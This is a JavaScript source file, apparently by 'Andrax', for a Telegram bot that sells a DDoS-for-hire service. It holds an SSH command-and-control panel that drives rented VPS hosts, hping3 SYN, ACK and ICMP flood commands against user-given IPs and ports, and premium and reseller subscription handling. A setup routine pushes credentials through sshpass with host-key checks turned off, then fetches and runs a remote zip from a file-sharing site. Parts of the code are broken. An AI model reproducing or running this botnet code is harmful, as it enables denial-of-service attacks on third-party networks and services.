//By Andrax.js :v dont sell this kids :v

const fs = require("fs");
const axios = require("axios");
const path = require("path");
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const { Client } = require('ssh2');
const resellerPath = './reseller.json';

// === Config Token & Files Reading===
const token = 'tokwn lu';
const OWNER_ID = 'id lu';

const SERVER_FILE = "./ewe/serverapi.json";
const servers = JSON.parse(fs.readFileSync(SERVER_FILE, "utf8"));

function loadAdminIDs() {
  const adminFile = "./ewe/admin.json";

  if (!fs.existsSync(adminFile)) {
    console.error("⚠️ File admin.json tidak ditemukan!");
    return [];
  }

  try {
    const data = JSON.parse(fs.readFileSync(adminFile, "utf8"));
    if (!Array.isArray(data)) throw new Error("Format admin.json harus berupa array!");
    return data;
  } catch (err) {
    console.error("⚠️ Gagal membaca admin.json:", err.message);
    return [];
  }
}

const ADMIN_IDS = loadAdminIDs();

if (!fs.existsSync(SERVER_FILE)) fs.writeFileSync(SERVER_FILE, "[]");

const bot = new TelegramBot(token, { polling: true });
const isOwner = (senderId) => String(senderId) === OWNER_ID;
const ensureJSONFile = (file, defaultData) => {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
};
const getResellerList = () => {
  if (!fs.existsSync(resellerPath)) return [];
  return JSON.parse(fs.readFileSync(resellerPath));
};
const isReseller = (id) => {
  const list = getResellerList();
  return list.includes(Number(id));
};
const addReseller = (id) => {
  const list = getResellerList();
  if (!list.includes(id)) {
    list.push(id);
    fs.writeFileSync(resellerPath, JSON.stringify(list, null, 2));
    return true;
  }
  return false;
};
const removeReseller = (id) => {
  let list = getResellerList();
  if (list.includes(id)) {
    list = list.filter(r => r !== id);
    fs.writeFileSync(resellerPath, JSON.stringify(list, null, 2));
    return true;
  }
  return false;
};

ensureJSONFile('vps.json', []);
ensureJSONFile('premium.json', []);

let vpsList = JSON.parse(fs.readFileSync('vps.json', 'utf8'));
let premiumUsers = JSON.parse(fs.readFileSync('premium.json', 'utf8'));

fs.watch('vps.json', () => {
  vpsList = JSON.parse(fs.readFileSync('vps.json', 'utf8'));
  console.log("🔄 vps.json updated");
});

fs.watch('premium.json', () => {
  premiumUsers = JSON.parse(fs.readFileSync('premium.json', 'utf8'));
  console.log("🔄 premium.json updated");
});

const plansFile = 'plans.json';

function loadPlans() {
  if (!fs.existsSync(plansFile)) return {};
  return JSON.parse(fs.readFileSync(plansFile));
}

function savePlans(data) {
  fs.writeFileSync(plansFile, JSON.stringify(data, null, 2));
}

function isPremium(id) {
  const plans = loadPlans();
  return id in plans;
}

function getOnlineDuration() {
  let onlineDuration = new Date() - startTime; // Durasi waktu online dalam milidetik

  // Convert durasi ke format jam:menit:detik
  let seconds = Math.floor((onlineDuration / 1000) % 60); // Detik
  let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60); // Menit
  let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24); // Jam

  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

const getUserName = (msg) => {
    const user = msg.from;
    return user.first_name || user.username || 'User';
};

//==========================//
//configuration botnets
let cncActive = false;
let vpsConnections = {};
const ongoingAttacks = [];
const attackHistory = [];




// Save dan hapus log serangan
const saveAttack = (arr, data) => arr.push(data);
const removeOngoingAttack = (target) => {
  const i = ongoingAttacks.findIndex(a => a.Target === target);
  if (i !== -1) ongoingAttacks.splice(i, 1);
};
const moveOngoingToHistory = () => {
  attackHistory.push(...ongoingAttacks);
  ongoingAttacks.length = 0;
};

// Connect VPS
const connectToAllVPS = () => {
  if (!cncActive) return;
  console.log("🔌 Connecting to all VPS...");
  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) continue;

    const conn = new Client();
    conn.on('ready', () => {
      if (!cncActive) return conn.end();
      console.log(`✅ Connected to ${vps.host}`);
      vpsConnections[vps.host] = conn;
      conn.on('close', () => {
        console.log(`🔌 Disconnected from ${vps.host}`);
        delete vpsConnections[vps.host];
        if (cncActive) setTimeout(connectToAllVPS, 5000);
      });
    });
    conn.on('error', err => console.log(`❌ ${vps.host}: ${err.message}`));
    conn.connect({
      host: vps.host,
      username: vps.username || "root",
      password: vps.password,
      readyTimeout: 5000
    });
  }
};

const disconnectAllVPS = () => {
  console.log("🛑 Disconnecting all VPS...");
  cncActive = false;
  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
};

const executeOnVPS = async (vps, command) => {
  return new Promise((resolve, reject) => {
    if (!cncActive || !vpsConnections[vps.host]) {
      console.log(`❌ No active connection to ${vps.host}.`);
      return resolve({ vps, success: false });
    }

    vpsConnections[vps.host].exec(`screen -dmS andrax_ceduah_${Date.now()} bash -c '${command}'`, (err) => {
      if (err) {
        console.log(`❌ Failed to execute command on ${vps.host}: ${err.message}`);
        return resolve({ vps, success: false });
      }
      resolve({ vps, success: true });
    });
  });
};

const executeCommand = async (command, userId, target, method) => {
  if (!cncActive) return "❌ CNC is not active";

  const attack = {
    User: userId,
    Target: target,
    Method: method,
    Date: new Date().toISOString()
  };

  saveAttack(ongoingAttacks, attack);

  let success = 0;
  for (const vps of vpsList) {
    try {
      const result = await executeOnVPS(vps, command);
      if (result.success) success++;
    } catch (err) {
      console.log(`❌ ${vps.host}: ${err.message}`);
    }
  }

  removeOngoingAttack(target);
  saveAttack(attackHistory, attack);
  return `✅ Succses Sent to ${success} VPS`;
};

// Fungsi StopAll untuk menghentikan semua serangan
const stopAllScreens = async () => {
  console.log(`\n🛑 Stopping all running screen sessions...`);
  await executeCommand("pkill screen");
  moveOngoingToHistory();
  console.log(`✅ All ongoing attacks moved to history.`);
};
//==============\
//check status vps
const checkVps = async (vps) => {
  return new Promise((resolve) => {
    const conn = new Client();
    conn.on('ready', () => {
      console.log(`✅ VPS ${vps.host} is active.`);
      conn.end();
      resolve(true);
    }).on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
      resolve(false);
    }).connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  });
};

const removeInvalidVps = async (msg, bot) => {
  const vpsList = JSON.parse(fs.readFileSync('vps.json')); 
  let aliveVps = [];
  let removedVps = [];
  let statusMessage = '';
  
  for (const [index, vps] of vpsList.entries()) {
    const isAlive = await checkVps(vps);
    const vpsStatus = isAlive ?
      `VPS ${String(index + 1).padStart(2, '0')} : ✅ Online` :
      `VPS ${String(index + 1).padStart(2, '0')} : 🔴 Offline / Die`;

    statusMessage += vpsStatus + '\n';

    if (!isAlive) {
      removedVps.push(vps.host);
    } else {
      aliveVps.push(vps);
    }
  }

  fs.writeFileSync('vps.json', JSON.stringify(aliveVps, null, 2));
  console.log("✅ vps.json updated. Removed invalid VPS.");

  await bot.sendMessage(msg.chat.id, statusMessage);

  const message = removedVps.length > 0 ?
    `❌ Removed VPS:\n${removedVps.join('\n')}` :
    "✅ All VPS are active, no removals.";

  return message;
};

//====================\\
//configuration plans
function parseTime(str) {
  const unit = str.slice(-1);
  const num = parseInt(str.slice(0, -1));
  if (isNaN(num)) return null;

  switch (unit) {
    case 'h': return num * 60 * 60 * 1000;
    case 'd': return num * 24 * 60 * 60 * 1000;
    case 'm': return num * 30 * 24 * 60 * 60 * 1000;
    case 'y': return num * 365 * 24 * 60 * 60 * 1000;
    default: return null;
  }
}

// ============== //
//command on Telegram bot 

const attackCmd = (name, template, requiredArgs) => {
  bot.onText(new RegExp(`^/${name}\\s+(.+)`), async (msg, match) => {
    const chatId = msg.chat.id;
    const sender = String(msg.from.id);
    const now = new Date();
    const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
    const userName = getUserName(msg);

    if (!isPremium(sender) && !isOwner(sender) && !isReseller(sender)) {
      return bot.sendMessage(chatId, 'Ngapain lu jir, buy prem sini ke @AndraxMaker');
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, `Prefix: /${name} <ip> <port> <time>`);
    }

    const args = match[1].trim().split(/\s+/);
    if (args.length < requiredArgs) {
      return bot.sendMessage(chatId, `Prefix: /${name} <ip> <port> <time>`);
    }

    if (!vpsList || vpsList.length === 0) {
      return bot.sendMessage(chatId, '❌ Tidak ada server CNC aktif. Tunggu owner nyalain dulu.');
    }

    const targetIP = args[0];
    const port = args[1] || 'N/A';
    const time = args[2] || 'N/A';
    const cmd = template(args);

    let result;
    try {
      result = await executeCommand(cmd, sender, targetIP, name.toUpperCase());
    } catch (err) {
      return bot.sendMessage(chatId, `Gagal eksekusi serangan: ${err.message}`);
    }

    const caption = `
𓂀 Attack Successfully Sent All Server 𓂀

Detail Attack:
╰┈➤ 👤Send by users: ${userName}
╰┈➤ 🌐Target:  ${targetIP}
╰┈➤ 🚪Port: ${port}
╰┈➤ ⌛Duration: ${time} seconds
╰┈➤ 📌Methods: ${name.toUpperCase()}
╰┈➤ 📆Date: ${tanggal}
╰┈➤ ⚔️Executed Status: ${result}

Detail Credits:

╰➤ ℹ️ : owner bot @AndraxMaker
╰➤ ℹ️ : buy premium on : @AndraxMaker
╰➤ ℹ️ : power/proof ch : t.me/SpaceeStresser (public)

ℹ️ Note: If there is a problem with the bot  or anything, please contact the owner @AndraxMaker.
`;
    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🛑 STOP ATTACK',
              callback_data: 'func_stop'
            }
          ]
        ]
      }
    };
    bot.sendPhoto(chatId, 'https://cloudkuimages.guru/uploads/images/68189e9f15a1f.jpg', { caption, ...keyboard });
  });

  bot.on('callback_query', (query) => {
    if (query.data === 'func_stop') {
      stopAllScreens();
      bot.answerCallbackQuery(query.id, { text: 'Attack stopped!', show_alert: true });
    }
  });
};



// Attack command definitions
attackCmd("syn-pps", args => `sudo timeout ${args[2]}s hping3 -S --flood -p ${args[1]} ${args[0]}`, 3);
attackCmd("syn-gbps", args => `sudo timeout ${args[2]}s hping3 -S --flood --data 65495 -p ${args[1]} ${args[0]}`, 3);
attackCmd("ack-pps", args => `sudo timeout ${args[2]}s hping3 -A --flood -p ${args[1]} ${args[0]}`, 3);
attackCmd("ack-gbps", args => `sudo timeout ${args[2]}s hping3 -A --flood --data 65495 -p ${args[1]} ${args[0]}`, 3);
attackCmd("icmp-pps", args => `sudo timeout ${args[1]}s hping3 --icmp --flood ${args[0]}`, 2);
attackCmd("icmp-gbps", args => `sudo timeout ${args[1]}s hping3 --icmp --flood --data 65495 ${args[0]}`, 2);
//==================\\
//start menu
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const imageUrl = "https://cloudkuimages.guru/uploads/images/68189e9f15a1f.jpg";

  const menuUtama = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "👑 DDoS Menu ", callback_data: "menu_hack" }],
        [{ text: "🖥️ Owner Menu ", callback_data: "menu_admin" }],
        [{ text: "ℹ️ About This ", callback_data: "menu_secret" }]
      ]
    }
  };

  const caption = `🔥 *Welcome To ÆTHERVOID V1.1.0* 🔥\n\nPlease select an option below:`;

  bot.sendPhoto(chatId, imageUrl, {
    caption,
    parse_mode: "Markdown",
    ...menuUtama
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const msg = callbackQuery.message;
  const messageId = msg.message_id;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;

  const backButton = {
    reply_markup: {
      inline_keyboard: [[{ text: "⬅️ Back", callback_data: "menu_home" }]]
    },
    parse_mode: "Markdown"
  };

  try {
    if (data === "menu_home") {
      const menuUtama = {
        reply_markup: {
          inline_keyboard: [
            [{ text: "𓂀 DDoS Menu ", callback_data: "menu_hack" }],
            [{ text: "𓂀 Owner Menu ", callback_data: "menu_admin" }],
            [{ text: "ℹ️ About This ", callback_data: "menu_secret" }]
          ]
        },
        parse_mode: "Markdown"
      };

      const caption = `🔥 *Welcome To ÆTHERVOID V1.1.0* 🔥\n\nPlease select an option below:`;

      await bot.editMessageCaption(caption, {
        chat_id: chatId,
        message_id: messageId,
        ...menuUtama
      });

      return bot.answerCallbackQuery(callbackQuery.id);
    }

    let text = "";

    switch (data) {
      case "menu_hack":
        text = `*DDoS Methods List*\n\n` +
               `- /syn-gbps <Flood TCP SYN high GBPS>\n` +
               `- /syn-pps <Flood TCP SYN high PPS for Minecraft>\n` +
               `- /ack-gbps <Flood TCP ACK high GBPS for MLBB>\n` +
               `- /ack-pps <Flood TCP ACK high PPS for SAMP>\n` +
               `- /imcp-pps <IMCP flood no proxy>\n` +
               `- /imcp-gbps <Flood high GBPS for DigitalOcean>\n\n` +
               `*Usage:* /methods <ip> <port> <time>\n` +
               `*Example:* /syn-pps 123.123.12.123 53 120`;
        break;

      case "menu_admin":
  text = `*Admin & Owner Menu*\n\n` +
         `/cnc\\_start - Start C2 Panel\n` +
         `/cnc\\_stop - Stop C2 Panel\n` +
         `/cnc\\_info - C2 Panel Status\n` +
         `/addprem <id> - Add premium users\n` +
         `/addserver <ip> <password> - Add VPS for DDoS\n` +
         `/status - Checker Status Vps\n` +
         `/add\\_reseller <id> - Adding Re Seller Users\n` +
         `/remove\\_reseller <id> - Delete Users Re Seller\n`;
  break;

      case "menu_secret":
        text = `*About This Bot*\n\nThis bot was created by Andrax-dev.\nSpecial thanks to: Hanif (own3 space), Zyo (My Best Friends & Own1 Space)`;
        break;

      default:
        text = "🚫 Menu not found!";
    }

    await bot.editMessageCaption(text, {
      chat_id: chatId,
      message_id: messageId,
      ...backButton
    });
    bot.answerCallbackQuery(callbackQuery.id);
  } catch (err) {
    console.error("Edit failed:", err.message);
    try {
      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        ...backButton
      });
    } catch (err2) {
      console.error("Fallback editMessageText failed:", err2.message);
    }
  }
});
// CNC controls
bot.onText(/\/cnc_start/, async (msg) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  if (!isOwner(sender)) return bot.sendMessage(chatId, 'Mau Ngapain Konto.');
  if (cncActive) return bot.sendMessage(chatId, "❌ CNC already running.");
  console.log(sender);  
  cncActive = true;
  bot.sendMessage(chatId, "✅ CNC started. Connecting...");
  connectToAllVPS();
});

bot.onText(/\/cnc_stop/, async (msg) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  if (!isOwner(sender)) return bot.sendMessage(chatId, 'Mau Ngapain Konto.');
  if (!cncActive) return bot.sendMessage(chatId, "❌ CNC not running.");
  console.log(sender);
  disconnectAllVPS();
  bot.sendMessage(chatId, "🛑 CNC stopped.");
});

bot.onText(/\/cnc_info/, (msg) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  if (!isOwner(sender)) return bot.sendMessage(chatId, 'Mau Ngapain Konto.');
  console.log(sender);  
  const status = cncActive ? "Active" : "Inactive";
  const total = Object.keys(vpsConnections).length;
  bot.sendMessage(chatId, `CNC Status: ${status}\nActive VPS: ${total}`);
});

bot.onText(/\/setup(?:\s+(\S+))?(?:\s+(\S+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1]; 
  const password = match[2];
  const isValidIP = (ip) => {
  return /^(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)$/.test(ip);
};

if (!isValidIP(ip)) {
  bot.sendMessage(chatId, "⚠️ IP address tidak valid!");
  return;
}

  if (!ip) {
    bot.sendMessage(chatId, "⚠️ IP address belum dimasukkan!");
    return;
  }

  if (!isValidIP(ip)) {
    bot.sendMessage(chatId, "⚠️ IP address tidak valid!");
    return;
  }

  // Baru pakai di sini
  if (servers.some((s) => s.ip === ip)) {
    bot.sendMessage(chatId, `⚠️ Server dengan IP ${ip} sudah terdaftar.`);
    return;
  }
  
if (!ADMIN_IDS.includes(msg.from.id)) {
  bot.sendMessage(chatId, "⚠️ Lu nggak punya izin buat pake command ini!");
  return;
}
  
  if (!ip || !password) {
    bot.sendMessage(
      chatId,
      "⚠️ Format perintah salah!\n\n" +
        "Gunakan format berikut:\n" +
        "```/setup <IP> <PASSWORD>```\n\n" +
        "Contoh:\n" +
        "```/setup 192.168.1.100 mypassword123```",
      { parse_mode: "Markdown" }
    );
    return;
  }

  bot.sendMessage(chatId, `🔧 Memulai setup VPS pada ${ip}...`);

  const setupScript = `
      sshpass -p "${password}" ssh -o StrictHostKeyChecking=no -p 22 root@${ip} '
      apt update && apt install -y git curl screen rsync;
      
      # Install NVM & Node.js 20
      curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh | bash;
      export NVM_DIR="$HOME/.nvm";
      [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh";
      nvm install 20 && nvm use 20;

      # Bersihkan cache NPM sebelum install
      npm cache clean --force;

      # Install dependensi Node.js
      npm i axios fs fg net tls url path http https http2 cluster cheerio header-generator crypto gradient-string os colors hpack user-agents randomstring random-useragent minimist http2-wrapper child_process express node-fetch@2 socks;
      sudo apt install sysstat -y;
      apt install unzip;
      wget https://filebin.net/archive/se2un9w22t3itmue/zip;
      unzip zip;
      unzip api.zip

      # Jalankan script API dengan screen
      screen -dmS api node api.js
  `;

  exec(setupScript, { timeout: 60000 }, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `❌ Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `⚠️ Warning: ${stderr}`);
    }

    bot.sendMessage(chatId, `✅ Setup selesai di ${ip}!`);

    // Simpan ke daftar server.json
    let servers = [];
    try {
      servers = JSON.parse(fs.readFileSync(SERVER_FILE, "utf8"));
      if (!Array.isArray(servers)) throw new Error("Invalid JSON format");
    } catch (err) {
      console.error("⚠️ Error membaca serverapi.json:", err.message);
      servers = [];
    }

    servers.push({ ip, url: `http://${ip}:8080/api/attack?key=yeah` });
    fs.writeFileSync(SERVER_FILE, JSON.stringify(servers, null, 2));

    bot.sendMessage(chatId, `🔗 Server ditambahkan: http://${ip}:8080/api/attack?key=yeah`);
    
    password = null;
  });
});

bot.onText(/^\/addserver(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  if (!isOwner(sender)) return bot.sendMessage(chatId, '❌ Hanya owner.');
  if (!match[1]) {
    return bot.sendMessage(chatId, "Format: /addserver <ip> <password>");
  }
  const args = match[1].trim().split(/\s+/);
  if (args.length < 3) return bot.sendMessage(chatId, "Format: /addserver <ip> <user> <password>");

  vpsList.push({ host: args[0], username: args[1], password: args[2] });
  fs.writeFileSync('vps.json', JSON.stringify(vpsList, null, 2));
  bot.sendMessage(chatId, `✅ VPS ${args[0]} ditambahkan!`);
});

bot.onText(/\/addprem(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  if (!isOwner(sender) && !isReseller(sender)) return bot.sendMessage(chatId, 'Hanya Owner & Reseller.');

  if (!match[1]) {
    return bot.sendMessage(chatId, 'Format: /addprem <id> <timelimit> <cooldown> <cc> <expired>\nContoh: /addprem 123 60 10 1 7d');
  }

  const args = match[1].split(/\s+/);
  if (args.length < 5) {
    return bot.sendMessage(chatId, 'Format kurang lengkap!\nGunakan: /addprem <id> <timelimit> <cooldown> <cc> <expired>');
  }

  const [id, timelimit, cooldown, concurrent, expired] = args;
  const duration = parseTime(expired);
  if (!duration) return bot.sendMessage(chatId, '❌ Format expired salah. Gunakan: h, d, m, y');

  const plans = loadPlans();
  plans[id] = {
    timelimit: parseInt(timelimit),
    cooldown: parseInt(cooldown),
    concurrent: parseInt(concurrent),
    expired,
    expiresAt: Date.now() + duration
  };

  savePlans(plans);
  bot.sendMessage(chatId, `✅ User ${id} sekarang jadi PREMIUM selama ${expired}`);
});

bot.onText(/\/delprem (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  if (!isOwner(sender) && !isReseller(sender)) return bot.sendMessage(chatId, 'Hanya Owner & Reseller.');

  const id = match[1];
  const plans = loadPlans();

  if (!plans[id]) {
    return bot.sendMessage(chatId, `❌ User ${id} tidak ditemukan di plans.`);
  }

  delete plans[id];
  savePlans(plans);
  bot.sendMessage(chatId, `✅ User ${id} telah dihapus dari PREMIUM.`);
});

bot.onText(/^\/add_reseller (\d+)$/, (msg, match) => {
  const sender = msg.from.id;
  const chatId = msg.chat.id;
  const targetId = Number(match[1]);

  if (!isOwner(sender)) return bot.sendMessage(chatId, 'Lu bukan owner!');

  if (addReseller(targetId)) {
    bot.sendMessage(chatId, `✅ ID ${targetId} ditambahkan ke reseller.`);
  } else {
    bot.sendMessage(chatId, `⚠️ ID ${targetId} sudah jadi reseller.`);
  }
});

bot.onText(/^\/remove_reseller (\d+)$/, (msg, match) => {
  const sender = msg.from.id;
  const chatId = msg.chat.id;
  const targetId = Number(match[1]);

  if (!isOwner(sender)) return bot.sendMessage(chatId, 'Lu bukan owner!');

  if (removeReseller(targetId)) {
    bot.sendMessage(chatId, `✅ ID ${targetId} dihapus dari reseller.`);
  } else {
    bot.sendMessage(chatId, `⚠️ ID ${targetId} tidak ditemukan.`);
  }
});

bot.onText(/^\/status$/, async (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from?.id || msg.chat.id;

  if (!isOwner(sender)) return bot.sendMessage(chatId, 'Mau Ngapain Konto.');
  const caption = await removeInvalidVps(msg, bot);
  bot.sendPhoto(chatId, 'https://files.catbox.moe/sz185b.jpg', {
    caption,
  });
});

bot.onText(/\/addadmin (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const newAdminId = parseInt(match[1]);

  // Load daftar admin dari file
  let adminIds = loadAdminIDs();

  // Cek apakah user yang eksekusi command itu admin
  if (!adminIds.includes(userId)) {
    bot.sendMessage(chatId, "⚠️ Lu bukan admin, nggak bisa nambah admin lain!");
    return;
  }
  
  if (!isOwner(chatId)) {
        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
  }

  // Cek apakah ID yang mau ditambah udah ada di daftar admin
  if (adminIds.includes(newAdminId)) {
    bot.sendMessage(chatId, `⚠️ ID ${newAdminId} udah jadi admin!`);
    return;
  }

  // Tambahkan admin baru ke daftar
  adminIds.push(newAdminId);
  fs.writeFileSync("./ewe/admin.json", JSON.stringify(adminIds, null, 2));

  bot.sendMessage(chatId, `✅ Berhasil nambahin ID ${newAdminId} sebagai admin!`);
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//
bot.onText(/\/addadmin/, (msg) => {
    const chatId = msg.chat.id;

    if (!isOwner(chatId)) {
        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
    }

    const response = `
usage : /addadmin <id>
`;

    bot.sendMessage(chatId, response, { parse_mode: "Markdown" });
});


bot.onText(/\/setup/, (msg) => {
    const nyocot = msg.chat.id;

    if (!isOwner(chatId)) {
        return bot.sendMessage(chatId, '❌ You are not the premium users');
    }

    const response = `
usage : /setup <ip> <password>
`;

    bot.sendMessage(setup, response, { parse_mode: "Markdown" });
});

//==================\\
//check expired
function checkExpiredPlans() {
  const plans = loadPlans();
  const now = Date.now();
  let updated = false;

  for (const id in plans) {
    const user = plans[id];
    if (!user.expiresAt) {
      user.expiresAt = now + ms(user.expired);
      updated = true;
    } else if (now >= user.expiresAt) {
      delete plans[id];
      updated = true;
      console.log(`[INFO] Plan user ${id} expired & dihapus.`);
    }
  }

  if (updated) savePlans(plans);
}

checkExpiredPlans(); // Saat pertama jalan
setInterval(checkExpiredPlans, 60 * 60 * 1000); // Setiap 1 jam